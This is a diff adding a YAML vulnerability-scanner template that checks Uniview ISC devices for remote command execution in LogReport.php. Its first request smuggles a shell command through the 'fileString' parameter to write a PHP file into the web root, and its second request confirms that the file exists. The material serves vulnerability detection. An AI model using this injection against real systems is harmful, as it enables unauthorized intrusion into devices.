@@ -1,0 +1,36 @@
+id: poc-yaml-uniview-isc-logreport-php-rce
+info:
+  name: 浙江宇视科技ISC LogReport.php 远程命令执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20{{t2}}%20%3E%20/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /Interface/DevManage/{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
